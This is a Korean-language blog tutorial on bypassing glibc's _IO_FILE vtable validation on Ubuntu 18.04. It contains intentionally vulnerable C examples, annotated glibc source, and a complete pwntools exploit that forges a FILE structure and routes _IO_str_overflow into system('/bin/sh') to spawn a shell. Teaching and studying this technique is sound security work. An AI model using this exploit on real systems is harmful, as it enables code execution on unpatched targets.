---
title: "_IO_FILE vtable check bypass"
date: 2022-03-28 +0900
author: J0ngBae
categories: [Hacking, Pwn]
tags: ['system hacking', 'iofile', '2022']
---
> 우분투 16.04 이후 버전에서는 `_IO_vtable_check` 함수가 추가되어 이전과 같은 방법으로는 공격이 불가능하다.
{: .prompt-tip }

## vtable overwrite on ubuntu 18.04
`fp_vtable` 예제의 익스플로잇을 우분투 18.04 버전에서 실행한 결과는 다음과 같다.

- fp_vtable.c
    
    ```c
    // gcc -o fp_vtable fp_vtable.c
    
    #include <stdio.h>
    #include <unistd.h>
    #include <stdlib.h>
    
    char name[256] = "\0";
    FILE *fp = NULL;
    
    void getshell() {
            system("/bin/sh");
    }
    int main()
    {
            int bytes;
            char random[4];
            fp = fopen("/dev/urandom", "r");
    
            printf("Name: ");
            fflush(stdout);
    
            gets(name);
    
            fread(random, 1, 4, fp);
    
            printf("random: %s", random);
            return 0;
    }
    ```
    

```bash
(venv) b3ll@LAPTOP-9RLP0NRO:~/dreamhack/lecture/iofile$ python fp_vtable.py
[+] Starting local process './fp_vtable': pid 530
[*] '/home/b3ll/dreamhack/lecture/iofile/fp_vtable'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
b'Name:'
[*] Switching to interactive mode
 Fatal error: glibc detected an invalid stdio handle
[*] Got EOF while reading in interactive
$
[*] Process './fp_vtable' stopped with exit code -6 (SIGABRT) (pid 530)
[*] Got EOF while sending in interactive
```

`SIGABRT` 가 발생하며 프로그램이 비정상 종료된 것을 확인할 수 있다.

### Mitigation
이전 예제의 익스플로잇이 실패한 이유는 `IO_validate_vtable` 함수가 `_libc_IO_vtables` 의 섹션 크기를 계산한 후 파일 함수가 호출될 때 참조하는 vtable 주소가 `_libc_IO_vtables` 영역에 존재하는지 검증하기 때문이다.

```c
if (__glibc_unlikely (offset >= section_length))              
    _IO_vtable_check ();
```

만약 vtable 주소가 `_libc_IO_vtables` 영역에 존재하지 않는다면 `_IO_vtable_check` 함수를 호출하여 포인터를 추가로 확인하게 된다.

```c
void (*flag) (void) = atomic_load_relaxed (&IO_accept_foreign_vtables);
#ifdef PTR_DEMANGLE
  PTR_DEMANGLE (flag);
#endif
```

`IO_validate_vtable` 함수로 인해 파일 함수의 vtable은 `_libc_IO_vtables` 섹션에 존재해야 호출할 수 있다. 따라서 익스플로잇 과정에서 `_libc_IO_vtables` 섹션에 존재하는 함수들 중 공격에 유용한 함수를 사용해야 한다.

- IO_validate_vtable
    
    ```c
    static inline const struct _IO_jump_t *
    IO_validate_vtable (const struct _IO_jump_t *vtable)
    {
      uintptr_t section_length = __stop___libc_IO_vtables - __start___libc_IO_vtables;
      uintptr_t ptr = (uintptr_t) vtable;
      uintptr_t offset = ptr - (uintptr_t) __start___libc_IO_vtables;
      
      // check 
      if (__glibc_unlikely (offset >= section_length))              
        _IO_vtable_check ();
      return vtable;
    }
    ```
    
- _IO_vtable_check
    
    ```c
    void attribute_hidden
    _IO_vtable_check (void)
    {
    #ifdef SHARED
      /* Honor the compatibility flag.  */
      void (*flag) (void) = atomic_load_relaxed (&IO_accept_foreign_vtables);
    #ifdef PTR_DEMANGLE
      PTR_DEMANGLE (flag);
    #endif
      if (flag == &_IO_vtable_check)
        return;
      {
        Dl_info di;
        struct link_map *l;
        if (!rtld_active ()
            || (_dl_addr (_IO_vtable_check, &di, &l, NULL) != 0
                && l->l_ns != LM_ID_BASE))
          return;
      }
    #else /* !SHARED */
      if (__dlopen != NULL)
        return;
    #endif
      __libc_fatal ("Fatal error: glibc detected an invalid stdio handle\n");
    }
    ```
    
## vtable check bypass
`_IO_str_overflow` 함수는 `_IO_str_jumps` 영역 내에 존재하는 함수이다. `_IO_str_jumps` 영역은 `_libc_IO_vtables` 영역 내에 존재하기 때문에 이를 이용할 수 있다.

```c
new_buf = (char *) (*((_IO_strfile *) fp)->_s._allocate_buffer) (new_size);
```

`_IO_str_overflow` 함수에서 수많은 조건을 통과하게 되면 위와 같이 함수포인터를 호출하는 것을 불 수 있다.

호출되는 함수포인터의 첫 번째 인자인 `new_size` 는 다음과 같이 초기화된다.

```c
#define _IO_blen(fp) ((fp)->_IO_buf_end - (fp)->_IO_buf_base)

size_t old_blen = _IO_blen (fp);
_IO_size_t new_size = 2 * old_blen + 100;
if (new_size < old_blen)
   return EOF;
```

`_IO_blen` 매크로를 사용하여 초기화되는 `new_size` 변수는 `_IO_FILE` 구조체의 멤버 변수인 `_IO_buf_end` 와 `_IO_buf_base` 에 의해 결정된다. `IO_buf_base` 를 `0` 으로, `_IO_buf_end` 를 `(원하는 값 - 100) / 2` 로 조작하면 `new_size` 변수를 원하는 값으로 만들 수 있다.

`_s._allocate_buffer` 함수 포인터를 호출하기 위해서는 다음과 같은 조건을 만족해야한다.

```c
int flush_only = c == EOF;
_IO_size_t pos;
pos = fp->_IO_write_ptr - fp->_IO_write_base;
  if (pos >= (_IO_size_t) (_IO_blen (fp) + flush_only))
```

`flush_only` 의 기본 값은 `0` 이기 때문에 위 조건문은 `pos >= _IO_blen(fp)` 이다. 이 또한 `_IO_write_base` 를 `0` 으로 하고 `_IO_write_ptr` 을 원하는 값으로 하면 `pos` 변수를 원하는 값으로 만들 수 있기 때문에 조건을 만족하여 `_s.allocate_buffer` 함수 포인터를 호출할 수 있다.

- _IO_str_overflow
    
    ```c
    int
    _IO_str_overflow (_IO_FILE *fp, int c)
    {
      int flush_only = c == EOF;
      _IO_size_t pos;
      if (fp->_flags & _IO_NO_WRITES)
          return flush_only ? 0 : EOF;
      if ((fp->_flags & _IO_TIED_PUT_GET) && !(fp->_flags & _IO_CURRENTLY_PUTTING))
        {
          fp->_flags |= _IO_CURRENTLY_PUTTING;
          fp->_IO_write_ptr = fp->_IO_read_ptr;
          fp->_IO_read_ptr = fp->_IO_read_end;
        }
      pos = fp->_IO_write_ptr - fp->_IO_write_base;
      if (pos >= (_IO_size_t) (_IO_blen (fp) + flush_only))
        {
          if (fp->_flags & _IO_USER_BUF) /* not allowed to enlarge */
    	return EOF;
          else
    	{
    	  char *new_buf;
    	  char *old_buf = fp->_IO_buf_base;
    	  size_t old_blen = _IO_blen (fp);
    	  _IO_size_t new_size = 2 * old_blen + 100;
    	  if (new_size < old_blen)
    	    return EOF;
    	  new_buf
    	    = (char *) (*((_IO_strfile *) fp)->_s._allocate_buffer) (new_size);
    ```
    

`vtable_bypass.c` 는 파일 포인터에 300 바이트를 입력받고 `fclose` 함수를 호출하는 예제이다.

파일 포인터에 300 바이트를 입력받으므로 `_IO_write_ptr`, `_IO_buf_end`, `_lock`, `vtable` 을 전부 조작할 수 있기 때문에 `_IO_str_overflow` 함수를 호출할 수 있고, `_IO_str_overflow` 함수 내부에서 호출하는 `fp->_s._allocate_buffer` 또한 조작할 수 있어 원하는 함수를 호출할 수 있다.

- vtable_bypass.c
    
    ```c
    // gcc -o vtable_bypass vtable_bypass.c -no-pie
    
    #include <stdio.h>
    #include <unistd.h>
    
    FILE *fp;
    int main() {
    	setvbuf(stdin, 0, 2, 0);
    	setvbuf(stdout, 0, 2, 0);
    	fp = fopen("/dev/urandom","r");
    	printf("stdout: %p\n",stdout);
    
    	printf("Data: ");
    	read(0, fp, 300);
    
    	fclose(fp);
    }
    ```
    

주어진 `stdout` 주소를 통해 라이브러리 내에 존재하는 `_IO_file_jumps` 와 `_IO_str_overflow` 주소를 구할 수 있다. `system("/bin/sh")` 를 실행하기 위해서는 첫 번째 인자를 “/bin/sh” 문자열 포인터로 전달해 주어야 하기 때문에 `_IO_write_ptr` 와 `_IO_buf_end` 를 `("/bin/sh" 문자열의 주소 - 100) / 2` 로 조작했다.

`fclose` 함수가 호출하는 `_IO_new_fclose`  함수 내부에서 `_IO_FINISH` 함수가 호출된다.

```c
struct _IO_jump_t
{
    JUMP_FIELD(size_t, __dummy);
    JUMP_FIELD(size_t, __dummy2);
    JUMP_FIELD(_IO_finish_t, __finish);
    JUMP_FIELD(_IO_overflow_t, __overflow);
    JUMP_FIELD(_IO_underflow_t, __underflow);
    JUMP_FIELD(_IO_underflow_t, __uflow);
    JUMP_FIELD(_IO_pbackfail_t, __pbackfail);
    /* showmany */
    JUMP_FIELD(_IO_xsputn_t, __xsputn);
    JUMP_FIELD(_IO_xsgetn_t, __xsgetn);
    JUMP_FIELD(_IO_seekoff_t, __seekoff);
    JUMP_FIELD(_IO_seekpos_t, __seekpos);
    JUMP_FIELD(_IO_setbuf_t, __setbuf);
    JUMP_FIELD(_IO_sync_t, __sync);
    JUMP_FIELD(_IO_doallocate_t, __doallocate);
    JUMP_FIELD(_IO_read_t, __read);
    JUMP_FIELD(_IO_write_t, __write);
    JUMP_FIELD(_IO_seek_t, __seek);
    JUMP_FIELD(_IO_close_t, __close);
    JUMP_FIELD(_IO_stat_t, __stat);
    JUMP_FIELD(_IO_showmanyc_t, __showmanyc);
    JUMP_FIELD(_IO_imbue_t, __imbue);
};
```

위와 같이 `_IO_FINISH` 함수는 `_IO_jump + 16` 에 존재한다.

`vtable_bypass.py` 의 line 15에서 `fake_vtable` 을 `_IO_str_overflow - 16` 으로 설정한 이유는 `_IO_FINISH` 함수가 호출될 때 `vtable + 16` 을 참조하기 대문에 해당 주소가 `_IO_str_overflow` 함수를 가리키게 하기 위함이다. 이로 인해 `_IO_FINISH` 함수가 아닌 `_IO_str_overflow` 함수가 호출된다.

line 28과 line 31에서 `_IO_write_ptr` 과 `_IO_buf_end` 포인터를 `("/bin/sh" 문자열의 주소 - 100)/2` 로 조작했기 때문에 `new_size` 는 “/bin/sh” 문자열을 가리키데 된다.

그리고 `fp->_s.allocate_buffer` 함수 포인터를 `system` 함수 주소로 조작함으로써 `system("/bin/sh")` 가 실행되어 쉘을 획득할 수 있다.

- vtable_bypass.py
    
    ```python
    #vtable_bypass.py
    from pwn import *
    
    p = process("./vtable_bypass")
    
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    elf = ELF('./vtable_bypass')
    
    print(p.recvuntil("stdout: "))
    leak = int(p.recvuntil("\n").strip("\n"),16)
    
    libc_base = leak - libc.symbols['_IO_2_1_stdout_']
    io_file_jumps = libc_base + libc.symbols['_IO_file_jumps']
    io_str_overflow = io_file_jumps + 0xd8
    fake_vtable = io_str_overflow - 16
    binsh = libc_base + next(libc.search("/bin/sh"))
    system = libc_base + libc.symbols['system']
    fp = elf.symbols['fp']
    
    print(hex(libc_base))
    
    payload = p64(0x0) # flags
    payload += p64(0x0) # _IO_read_ptr
    payload += p64(0x0) # _IO_read_end
    payload += p64(0x0) # _IO_read_base
    payload += p64(0x0) # _IO_write_base
    payload += p64( ( (binsh - 100) / 2 )) # _IO_write_ptr
    payload += p64(0x0) # _IO_write_end
    payload += p64(0x0) # _IO_buf_base
    payload += p64( ( (binsh - 100) / 2 )) # _IO_buf_end
    payload += p64(0x0) # _IO_save_base
    payload += p64(0x0) # _IO_backup_base
    payload += p64(0x0) # _IO_save_end
    payload += p64(0x0) # _IO_marker
    payload += p64(0x0) # _IO_chain
    payload += p64(0x0) # _fileno
    payload += p64(0x0) # _old_offset
    
    payload += p64(0x0)
    payload += p64(fp + 0x80) # _lock 
    
    payload += p64(0x0)*9
    payload += p64(fake_vtable) # io_file_jump overwrite 
    payload += p64(system) # fp->_s._allocate_buffer RIP
    
    p.send(payload)
    
    p.interactive()
    ```